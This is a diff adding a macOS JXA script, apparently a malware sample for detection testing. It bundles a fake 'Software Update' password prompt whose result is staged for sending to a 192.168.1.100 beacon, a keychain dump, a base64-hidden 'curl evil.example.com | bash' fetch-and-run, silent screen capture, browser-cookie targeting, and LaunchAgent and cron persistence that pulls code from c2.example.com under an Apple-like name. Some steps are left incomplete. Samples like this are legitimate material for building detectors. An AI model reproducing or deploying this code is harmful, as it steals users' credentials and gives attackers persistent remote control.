@@ -1,0 +1,81 @@
+// Example JXA (JavaScript for Automation) with suspicious patterns
+// Demonstrates ObjC bridge abuse, credential theft, and persistence
+
+ObjC.import('Foundation');
+ObjC.import('AppKit');
+ObjC.import('Security');
+
+// Process execution via NSTask (ObjC bridge)
+var task = $.NSTask.alloc.init;
+task.launchPath = '/bin/bash';
+task.arguments = ['-c', 'whoami && id && hostname'];
+var pipe = $.NSPipe.pipe;
+task.standardOutput = pipe;
+task.launch;
+task.waitUntilExit;
+
+var data = pipe.fileHandleForReading.readDataToEndOfFile;
+var output = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
+
+// Network operations via NSURLSession
+var url = $.NSURL.URLWithString('http://192.168.1.100:4444/beacon');
+var request = $.NSMutableURLRequest.requestWithURL(url);
+request.HTTPMethod = 'POST';
+var session = $.NSURLSession.sharedSession;
+
+// Credential harvesting via display dialog
+var app = Application.currentApplication();
+app.includeStandardAdditions = true;
+var result = app.displayDialog('Enter your password to update macOS:', {
+    defaultAnswer: '',
+    withTitle: 'Software Update',
+    hiddenAnswer: true,
+    withIcon: 'caution'
+});
+var password = result.textReturned;
+
+// Exfiltrate stolen credentials
+var postBody = $.NSString.alloc.initWithUTF8String('password=' + password + '&user=' + output);
+request.HTTPBody = postBody.dataUsingEncoding($.NSUTF8StringEncoding);
+
+// Keychain dump
+var keychainTask = $.NSTask.alloc.init;
+keychainTask.launchPath = '/usr/bin/security';
+keychainTask.arguments = ['dump-keychain', '-d'];
+
+// Dynamic code execution
+var encodedPayload = 'Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9zdGFnZTIuc2ggfCBiYXNo';
+var decoded = $.NSString.alloc.initWithDataEncoding(
+    $.NSData.alloc.initWithBase64EncodedStringOptions(encodedPayload, 0),
+    $.NSUTF8StringEncoding
+).js;
+eval(decoded);
+
+// Screen capture
+var screenTask = $.NSTask.alloc.init;
+screenTask.launchPath = '/usr/sbin/screencapture';
+screenTask.arguments = ['-x', '/tmp/.screenshot.png'];
+screenTask.launch;
+
+// Browser cookie theft
+var cookiePath = ObjC.unwrap($.NSHomeDirectory()) + '/Library/Cookies/Cookies.binarycookies';
+
+// LaunchAgent persistence
+var plist = '<?xml version="1.0"?>\n<plist version="1.0">\n<dict>\n' +
+    '<key>Label</key><string>com.apple.update.agent</string>\n' +
+    '<key>ProgramArguments</key><array><string>/usr/bin/osascript</string>' +
+    '<string>-l</string><string>JavaScript</string><string>-e</string>' +
+    '<string>eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding(' +
+    '$.NSData.alloc.initWithContentsOfURL($.NSURL.URLWithString(' +
+    '"http://c2.example.com/jxa")),' +
+    '$.NSUTF8StringEncoding)))</string></array>\n' +
+    '<key>RunAtLoad</key><true/>\n</dict>\n</plist>';
+
+var plistPath = ObjC.unwrap($.NSHomeDirectory()) + '/Library/LaunchAgents/com.apple.update.agent.plist';
+$(plist).writeToFileAtomically(plistPath, true);
+
+// Cron persistence fallback
+var cronTask = $.NSTask.alloc.init;
+cronTask.launchPath = '/bin/bash';
+cronTask.arguments = ['-c', '(crontab -l 2>/dev/null; echo "*/5 * * * * osascript -l JavaScript /tmp/.update.js") | crontab -'];
+cronTask.launch;
